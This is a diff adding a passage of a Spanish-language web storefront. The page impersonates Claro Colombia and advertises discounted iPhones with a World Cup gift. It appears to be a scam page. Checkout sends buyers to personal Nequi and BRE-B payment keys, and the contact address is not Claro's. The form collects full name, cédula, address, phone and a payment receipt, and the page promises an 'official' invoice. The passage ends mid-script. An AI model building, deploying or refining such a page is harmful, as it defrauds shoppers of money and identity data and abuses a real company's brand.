@@ -1,0 +1,824 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes">
+    <title>Claro Colombia | iPhone 17,16,15,14 - 20% OFF + Regalo Exclusivo</title>
+    <link rel="icon" type="image/png" href="https://i.ibb.co/W4CNRJJh/pngwing-com.png">
+    <link href="https://fonts.googleapis.com/css2?family=Inter:opsz,wght@14..32,300;14..32,400;14..32,500;14..32,600;14..32,700;14..32,800&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/jspdf/2.5.1/jspdf.umd.min.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/jspdf-autotable/3.5.31/jspdf.plugin.autotable.min.js"></script>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: 'Inter', sans-serif;
+            background: #fef7f5;
+            padding-bottom: 90px;
+            color: #1a1e2b;
+        }
+
+        :root {
+            --claro-red: #E31837;
+            --claro-red-dark: #b8102a;
+            --claro-gold: #ffb347;
+            --shadow-sm: 0 12px 28px rgba(0, 0, 0, 0.06);
+            --shadow-md: 0 18px 36px -12px rgba(0, 0, 0, 0.12);
+        }
+
+        .top-bar {
+            background: var(--claro-red);
+            color: white;
+            padding: 0.6rem 1rem;
+            font-size: 0.7rem;
+            display: flex;
+            justify-content: space-between;
+            flex-wrap: wrap;
+            gap: 0.5rem;
+            font-weight: 500;
+        }
+
+        .main-header {
+            background: white;
+            padding: 0.7rem 1rem;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            flex-wrap: wrap;
+            border-bottom: 2px solid var(--claro-red);
+            box-shadow: 0 2px 10px rgba(0,0,0,0.02);
+            position: sticky;
+            top: 0;
+            z-index: 100;
+            gap: 12px;
+        }
+        .logo {
+            display: flex;
+            align-items: center;
+            gap: 12px;
+            flex-wrap: wrap;
+        }
+        .logo img {
+            height: 48px;
+            width: auto;
+        }
+        /* Camión animado */
+        .shipping-animation {
+            display: inline-flex;
+            align-items: center;
+            gap: 6px;
+            background: #fef2e6;
+            padding: 6px 12px;
+            border-radius: 40px;
+            font-size: 0.75rem;
+            font-weight: 600;
+            color: #b45f06;
+            white-space: nowrap;
+            box-shadow: 0 2px 6px rgba(0,0,0,0.05);
+            transition: all 0.2s;
+        }
+        .shipping-animation i {
+            font-size: 1.1rem;
+            color: var(--claro-red);
+            animation: truckMove 0.6s ease-in-out infinite alternate;
+        }
+        @keyframes truckMove {
+            0% { transform: translateX(0px); }
+            100% { transform: translateX(5px); }
+        }
+        /* Ajuste responsive */
+        @media (max-width: 640px) {
+            .shipping-animation {
+                font-size: 0.65rem;
+                padding: 4px 8px;
+                white-space: nowrap;
+            }
+            .shipping-animation i {
+                font-size: 0.9rem;
+            }
+        }
+        .search-cart {
+            display: flex;
+            align-items: center;
+            gap: 1rem;
+        }
+        .search-box {
+            background: #f5f5f5;
+            border-radius: 40px;
+            padding: 0.4rem 0.8rem;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+        }
+        .search-box input {
+            border: none;
+            background: transparent;
+            padding: 6px 0;
+            font-size: 0.8rem;
+            width: 140px;
+            outline: none;
+        }
+
+        .hero {
+            text-align: center;
+            padding: 1.5rem 1rem;
+            background: linear-gradient(135deg, #fff5f3, #fff0ee);
+        }
+        .hero-badge {
+            background: var(--claro-red);
+            color: white;
+            display: inline-block;
+            padding: 0.3rem 1rem;
+            border-radius: 60px;
+            font-size: 0.7rem;
+            font-weight: 700;
+            margin-bottom: 0.6rem;
+        }
+        .hero h1 {
+            font-size: 1.8rem;
+            font-weight: 800;
+            color: var(--claro-red-dark);
+        }
+
+        .container {
+            max-width: 1200px;
+            margin: 1.5rem auto;
+            padding: 0 1rem;
+        }
+        .section-title {
+            margin-bottom: 1.5rem;
+            border-left: 6px solid var(--claro-red);
+            padding-left: 1rem;
+            font-size: 1.3rem;
+            font-weight: 700;
+            display: flex;
+            align-items: center;
+            gap: 0.5rem;
+        }
+
+        /* Product grid: 2 columnas en móvil y alturas uniformes por fila */
+        .product-grid {
+            display: grid;
+            grid-template-columns: repeat(2, 1fr);
+            gap: 1.2rem;
+        }
+        @media (min-width: 768px) {
+            .product-grid {
+                grid-template-columns: repeat(3, 1fr);
+            }
+        }
+        @media (min-width: 1024px) {
+            .product-grid {
+                grid-template-columns: repeat(4, 1fr);
+            }
+        }
+
+        /* Tarjetas con altura flexible pero alineación perfecta de precio y botón */
+        .product-card {
+            background: white;
+            border-radius: 28px;
+            overflow: hidden;
+            box-shadow: var(--shadow-sm);
+            transition: all 0.25s ease;
+            border: 1px solid rgba(227, 24, 55, 0.12);
+            display: flex;
+            flex-direction: column;
+            height: 100%;
+        }
+        .product-card:hover {
+            transform: translateY(-4px);
+            box-shadow: var(--shadow-md);
+            border-color: rgba(227, 24, 55, 0.3);
+        }
+        .gallery-container {
+            padding: 0.8rem;
+            background: #fefaf9;
+            border-bottom: 1px solid #ffefef;
+        }
+        .main-image {
+            width: 100%;
+            height: 160px;
+            object-fit: contain;
+            border-radius: 20px;
+            cursor: pointer;
+        }
+        .thumbnail-list {
+            display: flex;
+            gap: 0.4rem;
+            margin-top: 0.6rem;
+            justify-content: center;
+        }
+        .thumbnail {
+            width: 42px;
+            height: 42px;
+            object-fit: cover;
+            border-radius: 12px;
+            cursor: pointer;
+            border: 2px solid transparent;
+            opacity: 0.7;
+            transition: all 0.2s;
+        }
+        .thumbnail.active, .thumbnail:hover {
+            border-color: var(--claro-red);
+            opacity: 1;
+            transform: scale(1.05);
+        }
+        .card-info {
+            padding: 0.9rem;
+            flex: 1;
+            display: flex;
+            flex-direction: column;
+        }
+        .product-title {
+            font-weight: 800;
+            font-size: 1rem;
+            text-align: center;
+            margin-bottom: 6px;
+            min-height: 2.4rem;
+        }
+        .specs {
+            display: flex;
+            flex-wrap: wrap;
+            gap: 5px;
+            justify-content: center;
+            margin: 8px 0;
+        }
+        .specs span {
+            background: #fff1f0;
+            padding: 0.2rem 0.6rem;
+            border-radius: 30px;
+            font-size: 0.6rem;
+            font-weight: 600;
+            color: #b8102a;
+        }
+        .card-footer {
+            margin-top: auto;
+            display: flex;
+            flex-direction: column;
+            gap: 10px;
+        }
+        .price-container {
+            text-align: center;
+            display: flex;
+            justify-content: center;
+            align-items: baseline;
+            gap: 8px;
+            flex-wrap: wrap;
+        }
+        .old-price {
+            font-size: 0.75rem;
+            color: #8a8f9c;
+            text-decoration: line-through;
+        }
+        .new-price {
+            font-size: 1.2rem;
+            font-weight: 800;
+            color: var(--claro-red-dark);
+        }
+        .btn-add {
+            background: var(--claro-red);
+            color: white;
+            border: none;
+            padding: 10px 0;
+            border-radius: 60px;
+            font-weight: 700;
+            font-size: 0.75rem;
+            cursor: pointer;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 6px;
+            transition: 0.2s;
+            width: 100%;
+        }
+        .btn-add:hover {
+            background: var(--claro-red-dark);
+            transform: scale(1.01);
+        }
+
+        /* Carrito flotante */
+        .cart-floating {
+            position: fixed;
+            bottom: 24px;
+            right: 24px;
+            background: var(--claro-red);
+            width: 58px;
+            height: 58px;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            cursor: pointer;
+            box-shadow: 0 8px 20px rgba(227,24,55,0.4);
+            z-index: 1100;
+            border: 2px solid white;
+        }
+        .cart-badge {
+            position: absolute;
+            top: -5px;
+            right: -5px;
+            background: #1a2c3e;
+            color: white;
+            font-size: 0.7rem;
+            font-weight: bold;
+            min-width: 20px;
+            height: 20px;
+            border-radius: 30px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            padding: 0 5px;
+            border: 2px solid white;
+        }
+
+        /* Drawer */
+        .cart-drawer {
+            position: fixed;
+            top: 0;
+            right: -400px;
+            width: 100%;
+            max-width: 380px;
+            height: 100%;
+            background: white;
+            box-shadow: -4px 0 20px rgba(0,0,0,0.15);
+            z-index: 1300;
+            transition: right 0.3s ease;
+            display: flex;
+            flex-direction: column;
+        }
+        .cart-drawer.open { right: 0; }
+        .drawer-header {
+            background: var(--claro-red);
+            color: white;
+            padding: 1rem;
+            font-weight: 800;
+            display: flex;
+            justify-content: space-between;
+        }
+        .drawer-items {
+            flex: 1;
+            overflow-y: auto;
+            padding: 1rem;
+        }
+        .cart-item {
+            background: #fef8f7;
+            border-radius: 20px;
+            padding: 0.7rem;
+            margin-bottom: 0.7rem;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+        .drawer-total {
+            padding: 1rem;
+            font-weight: 800;
+            border-top: 2px solid #ffdbdb;
+            display: flex;
+            justify-content: space-between;
+            font-size: 1.1rem;
+        }
+        .empty-cart {
+            text-align: center;
+            padding: 2rem;
+            color: #aaa;
+        }
+        .overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0,0,0,0.3);
+            backdrop-filter: blur(3px);
+            z-index: 1200;
+            display: none;
+        }
+        .overlay.active { display: block; }
+
+        /* Modales */
+        .modal-base {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0,0,0,0.7);
+            backdrop-filter: blur(6px);
+            z-index: 2000;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            visibility: hidden;
+            opacity: 0;
+            transition: 0.2s;
+        }
+        .modal-base.active {
+            visibility: visible;
+            opacity: 1;
+        }
+        .modal-card {
+            background: white;
+            width: 90%;
+            max-width: 520px;
+            border-radius: 40px;
+            padding: 1.8rem;
+            position: relative;
+            animation: fadeUp 0.3s;
+            max-height: 90vh;
+            overflow-y: auto;
+        }
+        @keyframes fadeUp {
+            from { transform: translateY(20px); opacity: 0; }
+            to { transform: translateY(0); opacity: 1; }
+        }
+        .close-modal {
+            position: absolute;
+            top: 16px;
+            right: 20px;
+            font-size: 1.6rem;
+            cursor: pointer;
+            color: #aaa;
+            transition: 0.2s;
+        }
+        .close-modal:hover { color: var(--claro-red); transform: rotate(90deg); }
+        .gift-option {
+            background: #f7f3f2;
+            border-radius: 24px;
+            padding: 1rem;
+            margin-bottom: 1rem;
+            cursor: pointer;
+            border: 2px solid transparent;
+            display: flex;
+            align-items: center;
+            gap: 1rem;
+            transition: 0.1s;
+        }
+        .gift-option.selected {
+            background: #ffe0df;
+            border-color: var(--claro-red);
+        }
+
+        /* Checkout */
+        .checkout-container {
+            background: white;
+            width: 95%;
+            max-width: 700px;
+            border-radius: 48px;
+            padding: 1.8rem;
+            max-height: 90vh;
+            overflow-y: auto;
+        }
+        .payment-methods {
+            display: flex;
+            gap: 1rem;
+            margin-bottom: 1.5rem;
+        }
+        .payment-card {
+            flex: 1;
+            background: #f9f6f5;
+            border-radius: 28px;
+            padding: 12px;
+            text-align: center;
+            cursor: pointer;
+            border: 2px solid transparent;
+            transition: 0.2s;
+        }
+        .payment-card.selected {
+            background: linear-gradient(145deg, #fff0ee, #ffe3e1);
+            border-color: var(--claro-red);
+            box-shadow: 0 6px 14px rgba(227,24,55,0.1);
+        }
+        .payment-logo { width: 55px; margin-bottom: 6px; }
+        .copy-key {
+            background: #f1ecea;
+            border-radius: 60px;
+            padding: 10px 16px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            font-weight: 600;
+        }
+        .btn-copy-small {
+            background: var(--claro-red);
+            border: none;
+            border-radius: 40px;
+            padding: 6px 14px;
+            color: white;
+            font-weight: 600;
+            cursor: pointer;
+        }
+        .payment-breakdown {
+            background: #fef2e6;
+            border-radius: 28px;
+            padding: 14px;
+            margin: 16px 0;
+        }
+        .form-field {
+            margin-bottom: 16px;
+        }
+        .form-field input, .form-field textarea {
+            width: 100%;
+            padding: 14px 18px;
+            border-radius: 60px;
+            border: 1px solid #e2e8f0;
+            font-family: inherit;
+            font-size: 0.9rem;
+            background: #fefefe;
+            transition: 0.2s;
+        }
+        .form-field input:focus, .form-field textarea:focus {
+            outline: none;
+            border-color: var(--claro-red);
+            box-shadow: 0 0 0 3px rgba(227,24,55,0.1);
+        }
+        .file-label {
+            background: #f1ecea;
+            border-radius: 60px;
+            padding: 14px;
+            text-align: center;
+            cursor: pointer;
+            font-weight: 500;
+            border: 1px dashed var(--claro-red);
+        }
+        .btn-submit-form {
+            background: #1e293b;
+            color: white;
+            border: none;
+            padding: 14px;
+            border-radius: 60px;
+            font-weight: 800;
+            width: 100%;
+            margin-top: 1rem;
+            cursor: pointer;
+            transition: 0.2s;
+        }
+        .btn-submit-form:hover { background: #0f172a; transform: scale(0.99); }
+        footer {
+            background: #0f1722;
+            color: #aaa;
+            text-align: center;
+            padding: 1.2rem;
+            font-size: 0.7rem;
+            border-top: 4px solid var(--claro-red);
+        }
+        .toast-msg {
+            position: fixed;
+            bottom: 100px;
+            left: 50%;
+            transform: translateX(-50%);
+            background: #1e2a36;
+            color: white;
+            padding: 10px 20px;
+            border-radius: 60px;
+            z-index: 3000;
+            font-weight: 500;
+            font-size: 0.85rem;
+        }
+        @media (max-width: 640px) {
+            .payment-methods { flex-direction: column; }
+            .main-image { height: 140px; }
+            .thumbnail { width: 36px; height: 36px; }
+            .product-title { font-size: 0.9rem; }
+        }
+    </style>
+</head>
+<body>
+
+<div class="top-bar">
+    <div><i class="fas fa-map-marker-alt"></i> Claro Colombia | Envíos gratis</div>
+    <div><i class="fas fa-credit-card"></i> Aceptamos Nequi / BRE-B y pago contra entrega</div>
+</div>
+<div class="main-header">
+    <div class="logo">
+        <img src="https://i.ibb.co/W4CNRJJh/pngwing-com.png" alt="Claro Colombia">
+        <div class="shipping-animation">
+            <i class="fas fa-truck"></i>
+            <span>Envío gratis a todo Colombia</span>
+        </div>
+    </div>
+    <div class="search-cart">
+        <div class="search-box"><i class="fas fa-search"></i><input type="text" id="searchInput" placeholder="Buscar iPhone..."></div>
+    </div>
+</div>
+<div class="hero">
+    <div class="hero-badge">⚡ OFERTA MUNDIAL 2026 ⚡</div>
+    <h1>iPhone 17 · 16 · 15 · 14</h1>
+    <p style="margin-top: 6px;">20% OFF pagando con Nequi / BRE-B + Regalo exclusivo</p>
+</div>
+<div class="container">
+    <div class="section-title"><i class="fas fa-mobile-alt" style="color:#E31837;"></i> Todos los modelos disponibles</div>
+    <div class="product-grid" id="productGrid"></div>
+</div>
+<footer>
+    <p><i class="fas fa-store"></i> Claro Colombia - Precios con 20% descuento incluido.<br>
+    <button id="openPolicyBtn" style="background: none; border: none; color:#ffb347; cursor:pointer;"><i class="fas fa-file-contract"></i> Políticas de compra</button> | 
+    <a href="mailto:claroiphone@mbox.re" style="color:#aaa;">claroiphone@mbox.re</a></p>
+</footer>
+
+<!-- MODALES -->
+<div id="promoModal" class="modal-base"><div class="modal-card" style="text-align:center;"><span id="closePromoBtn" class="close-modal">&times;</span><img src="https://i.ibb.co/W4CNRJJh/pngwing-com.png" style="height:50px;"><div style="background:#E31837; color:white; display:inline-block; padding:5px 15px; border-radius:40px; margin:12px 0;">🔥 20% OFF + REGALO 🔥</div><h2 style="font-size:1.6rem;">Descuento exclusivo</h2><p>Paga con Nequi o BRE-B y recibe un regalo adicional</p><button id="acceptPromoBtn" class="btn-add" style="width:80%; margin: 20px auto 0;">Ver iPhones →</button></div></div>
+<div id="giftModal" class="modal-base"><div class="modal-card"><span id="closeGiftBtn" class="close-modal">&times;</span><h3 style="margin-bottom:1rem;">🎁 Elige tu regalo</h3><div id="giftOptionsContainer" class="gift-options"></div><button id="confirmGiftBtn" class="btn-add" style="margin-top:1rem;">Añadir regalo y continuar</button></div></div>
+<div id="policyModal" class="modal-base"><div class="modal-card"><span id="closePolicyBtn" class="close-modal">&times;</span><h3>Políticas de compra</h3><p>Envíos gratuitos · Garantía 1 año · Derecho de retracto 5 días · Datos protegidos Ley 1581 de 2012.</p></div></div>
+<div id="checkoutModal" class="modal-base"><div class="checkout-container"><span id="closeCheckoutBtn" class="close-modal">&times;</span><h3 style="margin-bottom:1rem; text-align:center;">Finalizar compra</h3><div class="payment-methods"><div id="nequiCard" class="payment-card selected"><img src="https://i.ibb.co/Rkzvbqc6/images-2.png" class="payment-logo"><strong>Nequi</strong></div><div id="brebCard" class="payment-card"><img src="https://i.ibb.co/JWCptNrj/images-5.jpg" class="payment-logo"><strong>BRE-B</strong></div></div><div id="nequiPanel"><div class="copy-key">📱 3202112323 <button id="copyNequiBtn" class="btn-copy-small">Copiar</button></div></div><div id="brebPanel" style="display:none;"><div class="copy-key">🔑 @3138237540 <button id="copyBrebBtn" class="btn-copy-small">Copiar</button></div></div><div style="display:flex; justify-content:center; gap:20px; margin:20px 0;"><label><input type="radio" name="payMode" value="full" checked> Pago total</label><label><input type="radio" name="payMode" value="partial"> Contra entrega (30% ahora)</label></div><div id="breakdownBox" class="payment-breakdown"></div><form id="finalOrderForm" enctype="multipart/form-data"><div class="form-field"><input type="text" name="Nombre" placeholder="Nombre completo *" required></div><div class="form-field"><input type="text" name="Cedula" placeholder="Cédula *" required></div><div class="form-field"><input type="text" name="Ciudad" placeholder="Ciudad *" required></div><div class="form-field"><input type="text" name="Direccion" placeholder="Dirección *" required></div><div class="form-field"><input type="tel" name="Telefono" placeholder="Teléfono *" required></div><div class="form-field"><textarea name="Observaciones" rows="2" placeholder="Observaciones (opcional)"></textarea></div><div class="form-field"><div id="fakeFileLabel" class="file-label"><i class="fas fa-cloud-upload-alt"></i> Adjuntar comprobante de pago *</div><input type="file" name="comprobante" id="proofFileInput" accept="image/*" style="display:none;" required></div><button type="submit" id="submitOrderFinal" class="btn-submit-form"><i class="fas fa-check-circle"></i> Confirmar pedido</button></form><div style="font-size:0.7rem; text-align:center; margin-top:1rem;">✅ Recibirás factura PDF con verificación oficial</div></div></div>
+
+<div id="cartFloating" class="cart-floating"><i class="fas fa-shopping-bag"></i><span id="floatingCartCount" class="cart-badge">0</span></div>
+<div id="cartOverlay" class="overlay"></div>
+<div id="cartDrawer" class="cart-drawer"><div class="drawer-header"><span><i class="fas fa-cart-shopping"></i> Mi carrito</span><button id="closeDrawerBtn" style="background:none; border:none; color:white; font-size:1.4rem;">&times;</button></div><div id="drawerItemsList" class="drawer-items"></div><div id="drawerTotalSection" class="drawer-total" style="display:none;"><span>Total:</span><span id="drawerTotalAmount">$0</span></div><div style="padding:1rem;"><button id="checkoutFromDrawer" class="btn-add" style="background:#1e293b;">Pagar ahora</button></div></div>
+
+<script>
+    (function(){
+        // ---------- CATÁLOGO COMPLETO (iPhone 14 al 17) ----------
+        const rawProducts = [
+            { name: "iPhone 17 Pro Max", originalPrice: 8299900, pantalla: "6.9″ OLED 120Hz", procesador: "A19 Pro", camara: "48MP Triple", almacenamiento: "256GB", año:2026, imagenes: ["https://i.ibb.co/4D1z5sg/descarga-1.jpg","https://i.ibb.co/5XQXBRYN/descarga.jpg"] },
+            { name: "iPhone 17 Pro", originalPrice: 6999900, pantalla: "6.3″ OLED 120Hz", procesador: "A19 Pro", camara: "48MP Triple", almacenamiento: "256GB", año:2026, imagenes: ["https://http2.mlstatic.com/D_Q_NP_760114-MCO107806644505_022026-B.webp","https://http2.mlstatic.com/D_Q_NP_947861-MCO107806644507_022026-B.webp"] },
+            { name: "iPhone 17 Air", originalPrice: 5499900, pantalla: "6.5″ OLED", procesador: "A19 Pro", camara: "48MP Fusion", almacenamiento: "256GB", año:2026, imagenes: ["https://http2.mlstatic.com/D_Q_NP_2X_845869-MCO107895127026_032026-T.webp","https://http2.mlstatic.com/D_Q_NP_2X_805682-MCO108650746479_032026-T.webp"] },
+            { name: "iPhone 17", originalPrice: 4499900, pantalla: "6.3″ OLED", procesador: "A19", camara: "48MP Dual", almacenamiento: "256GB", año:2026, imagenes: ["https://http2.mlstatic.com/D_Q_NP_938256-MLA97091350687_112025-B.webp","https://http2.mlstatic.com/D_Q_NP_874492-MLA96155706517_102025-B.webp"] },
+            { name: "iPhone 17e", originalPrice: 3999900, pantalla: "6.3″ OLED", procesador: "A19", camara: "48MP Fusion", almacenamiento: "256GB", año:2026, imagenes: ["https://i.ibb.co/rK77wKR0/images-1.jpg","https://i.ibb.co/Q7CPmxKb/images-2.jpg"] },
+            { name: "iPhone 16 Pro Max", originalPrice: 6499900, pantalla: "6.9″ OLED 120Hz", procesador: "A18 Pro", camara: "48MP Triple", almacenamiento: "256GB", año:2025, imagenes: ["https://http2.mlstatic.com/D_NQ_NP_910491-MLA99943901737_112025-O.webp","https://http2.mlstatic.com/D_Q_NP_741108-MLA94691570096_102025-B.webp"] },
+            { name: "iPhone 16 Pro", originalPrice: 5499900, pantalla: "6.3″ OLED 120Hz", procesador: "A18 Pro", camara: "48MP Triple", almacenamiento: "128GB", año:2025, imagenes: ["https://http2.mlstatic.com/D_Q_NP_638182-CBT109295674859_032026-B.webp","https://http2.mlstatic.com/D_Q_NP_2X_619928-CBT108495990220_032026-R.webp"] },
+            { name: "iPhone 16 Plus", originalPrice: 4399900, pantalla: "6.7″ OLED", procesador: "A18", camara: "48MP Fusion", almacenamiento: "128GB", año:2025, imagenes: ["https://http2.mlstatic.com/D_Q_NP_2X_603157-MLA95504801693_102025-R.webp","https://http2.mlstatic.com/D_Q_NP_2X_954263-MLA96683635211_102025-R.webp"] },
+            { name: "iPhone 16", originalPrice: 3899900, pantalla: "6.1″ OLED", procesador: "A18", camara: "48MP Fusion", almacenamiento: "128GB", año:2025, imagenes: ["https://http2.mlstatic.com/D_Q_NP_2X_811549-MLA96127186507_102025-R.webp","https://http2.mlstatic.com/D_Q_NP_2X_784680-MLA99888118191_112025-R.webp"] },
+            { name: "iPhone 16e", originalPrice: 2999900, pantalla: "6.1″ OLED", procesador: "A18", camara: "48MP Fusion", almacenamiento: "128GB", año:2025, imagenes: ["https://http2.mlstatic.com/D_Q_NP_715873-MLA96419807976_102025-B.webp","https://http2.mlstatic.com/D_Q_NP_852917-MLA96419895004_102025-B.webp"] },
+            { name: "iPhone 15 Pro Max", originalPrice: 4799900, pantalla: "6.7″ OLED 120Hz", procesador: "A17 Pro", camara: "48MP Triple", almacenamiento: "256GB", año:2024, imagenes: ["https://http2.mlstatic.com/D_Q_NP_2X_940859-MLA93082493742_092025-R.webp","https://http2.mlstatic.com/D_Q_NP_2X_768025-MLA94292418247_102025-R.webp"] },
+            { name: "iPhone 15 Pro", originalPrice: 4199900, pantalla: "6.1″ OLED 120Hz", procesador: "A17 Pro", camara: "48MP Triple", almacenamiento: "128GB", año:2024, imagenes: ["https://http2.mlstatic.com/D_Q_NP_934134-MCO108946165655_032026-B.webp","https://http2.mlstatic.com/D_Q_NP_637299-MCO108944463611_032026-B.webp"] },
+            { name: "iPhone 15 Plus", originalPrice: 3399900, pantalla: "6.7″ OLED", procesador: "A16 Bionic", camara: "48MP Dual", almacenamiento: "128GB", año:2024, imagenes: ["https://http2.mlstatic.com/D_Q_NP_910262-CBT99886111152_122025-B.webp","https://http2.mlstatic.com/D_Q_NP_898832-CBT111555925855_052026-B.webp"] },
+            { name: "iPhone 15", originalPrice: 2999900, pantalla: "6.1″ OLED", procesador: "A16 Bionic", camara: "48MP Dual", almacenamiento: "128GB", año:2024, imagenes: ["https://http2.mlstatic.com/D_Q_NP_2X_767731-MLA71782898424_092023-R.webp","https://http2.mlstatic.com/D_Q_NP_2X_832226-MLA95493131564_102025-R.webp"] },
+            { name: "iPhone 14 Pro Max", originalPrice: 3499900, pantalla: "6.7″ OLED 120Hz", procesador: "A16 Bionic", camara: "48MP Triple", almacenamiento: "128GB", año:2023, imagenes: ["https://http2.mlstatic.com/D_Q_NP_2X_621368-CBT90180163554_082025-T.webp","https://http2.mlstatic.com/D_Q_NP_690987-MCO108944458609_032026-B.webp"] },
+            { name: "iPhone 14 Pro", originalPrice: 2999900, pantalla: "6.1″ OLED 120Hz", procesador: "A16 Bionic", camara: "48MP Triple", almacenamiento: "128GB", año:2023, imagenes: ["https://http2.mlstatic.com/D_Q_NP_2X_891616-MLA95398123990_102025-R.webp","https://http2.mlstatic.com/D_Q_NP_2X_750485-MLM51559388158_092022-R.webp"] },
+            { name: "iPhone 14 Plus", originalPrice: 2499900, pantalla: "6.7″ OLED", procesador: "A15 Bionic", camara: "12MP Dual", almacenamiento: "128GB", año:2023, imagenes: ["https://http2.mlstatic.com/D_Q_NP_2X_854068-MLA104272521249_012026-R.webp","https://http2.mlstatic.com/D_Q_NP_2X_673881-MLA104269429647_012026-R.webp"] },
+            { name: "iPhone 14", originalPrice: 2199900, pantalla: "6.1″ OLED", procesador: "A15 Bionic", camara: "12MP Dual", almacenamiento: "128GB", año:2023, imagenes: ["https://http2.mlstatic.com/D_Q_NP_844446-MLA104268834029_012026-B.webp","https://http2.mlstatic.com/D_Q_NP_745264-MLA103741007234_012026-B.webp"] }
+        ];
+        const DISCOUNT = 0.8;
+        let products = rawProducts.map(p => ({ ...p, priceCOP: Math.round(p.originalPrice * DISCOUNT), specsList: [p.pantalla, p.procesador, p.camara, p.almacenamiento], id: Math.random() })).sort((a,b)=>b.año - a.año);
+        let cart = [];
+        let pendingProduct = null;
+        let selectedGift = null;
+        const LOGO_URL = 'https://i.ibb.co/W4CNRJJh/pngwing-com.png';
+        function formatCOP(amount) { return new Intl.NumberFormat('es-CO', { style: 'currency', currency: 'COP', minimumFractionDigits: 0 }).format(amount); }
+        function showToast(msg) { let t = document.createElement('div'); t.className = 'toast-msg'; t.innerHTML = msg; document.body.appendChild(t); setTimeout(() => t.remove(), 2800); }
+        function saveCart() { localStorage.setItem('claro_cart', JSON.stringify(cart)); updateCartUI(); }
+        function updateCartUI() { 
+            let totalItems = cart.reduce((a,i)=> a + i.quantity,0); 
+            document.getElementById('floatingCartCount').innerText = totalItems;
+            renderDrawer(); 
+        }
+        function hasGift() { return cart.some(i => i.isGift === true); }
+        function addGift(giftName) { if (!hasGift()) cart.push({ id: 'gift_'+Date.now(), name: `🎁 ${giftName}`, price: 0, quantity: 1, isGift: true }); saveCart(); }
+        function addToCart(product) { if (!hasGift()) { pendingProduct = product; document.getElementById('giftModal').classList.add('active'); return; } let existing = cart.find(i => i.id === product.id && !i.isGift); if (existing) existing.quantity++; else cart.push({ id: product.id, name: product.name, price: product.priceCOP, quantity: 1, isGift: false }); saveCart(); showToast(`${product.name} añadido`); }
+        function renderDrawer() { let container = document.getElementById('drawerItemsList'); let totalDiv = document.getElementById('drawerTotalSection'); let totalSpan = document.getElementById('drawerTotalAmount'); if(cart.length===0){ container.innerHTML='<div class="empty-cart">🛒 Vacío</div>'; totalDiv.style.display='none'; return; } totalDiv.style.display='flex'; let html=''; let total=0; cart.forEach(item=>{ total+=item.price*item.quantity; let priceText=item.price===0?'Gratis':formatCOP(item.price); let subtotal=item.price===0?'$0':formatCOP(item.price*item.quantity); html+=`<div class="cart-item"><div><strong>${item.name}</strong><br>${priceText} x${item.quantity}<br><small>${subtotal}</small></div><div><button class="remove-item-btn" data-id="${item.id}" style="background:transparent; border:none; color:#E31837;"><i class="fas fa-trash-alt"></i></button></div></div>`; }); container.innerHTML=html; totalSpan.innerText=formatCOP(total); document.querySelectorAll('.remove-item-btn').forEach(btn=>btn.addEventListener('click',()=>{ let id=btn.dataset.id; cart=cart.filter(i=>i.id!=id); saveCart(); })); }
+        function clearCart(){ cart=[]; saveCart(); }
+        function getCartTotal(){ return cart.reduce((a,i)=> a + (i.price*i.quantity),0); }
+
+        // GIFTS
+        const gifts = ["Álbum Panini con fichas", "Camisa Selección Colombia autografiada", "Balón oficial del mundial"];
+        const giftContainer = document.getElementById('giftOptionsContainer');
+        giftContainer.innerHTML = gifts.map(g => `<div class="gift-option" data-gift="${g}"><i class="fas fa-gift fa-2x"></i> <span>${g}</span></div>`).join('');
+        document.querySelectorAll('.gift-option').forEach(opt=>opt.addEventListener('click',function(){ document.querySelectorAll('.gift-option').forEach(o=>o.classList.remove('selected')); this.classList.add('selected'); selectedGift=this.dataset.gift; }));
+        document.getElementById('confirmGiftBtn').addEventListener('click',()=>{ if(!selectedGift){ showToast('Elige un regalo'); return; } addGift(selectedGift); if(pendingProduct){ addToCart(pendingProduct); pendingProduct=null; } document.getElementById('giftModal').classList.remove('active'); showToast('Regalo agregado'); });
+
+        // RENDER PRODUCTOS
+        function renderProducts(filter=''){ 
+            let grid=document.getElementById('productGrid'); 
+            grid.innerHTML=''; 
+            let filtered=products.filter(p=>p.name.toLowerCase().includes(filter.toLowerCase())); 
+            filtered.forEach(p=>{ 
+                let card=document.createElement('div'); 
+                card.className='product-card'; 
+                let thumbs=''; 
+                p.imagenes.forEach((img,i)=>thumbs+=`<img src="${img}" class="thumbnail ${i===0?'active':''}" data-img="${img}" data-index="${i}">`); 
+                card.innerHTML=`<div class="gallery-container"><img class="main-image" src="${p.imagenes[0]}" data-full='${JSON.stringify(p.imagenes)}'><div class="thumbnail-list">${thumbs}</div></div>
+                                <div class="card-info">
+                                    <div class="product-title">${p.name}</div>
+                                    <div class="specs">${p.specsList.map(s=>`<span>${s}</span>`).join('')}</div>
+                                    <div class="card-footer">
+                                        <div class="price-container">
+                                            <span class="old-price">${formatCOP(p.originalPrice)}</span>
+                                            <span class="new-price">${formatCOP(p.priceCOP)}</span>
+                                        </div>
+                                        <button class="btn-add" data-id="${p.id}"><i class="fas fa-cart-plus"></i> Comprar</button>
+                                    </div>
+                                </div>`; 
+                grid.appendChild(card); 
+            }); 
+            document.querySelectorAll('.btn-add').forEach(btn=>btn.addEventListener('click',e=>{ let prod=products.find(p=>p.id==btn.dataset.id); if(prod) addToCart(prod); })); 
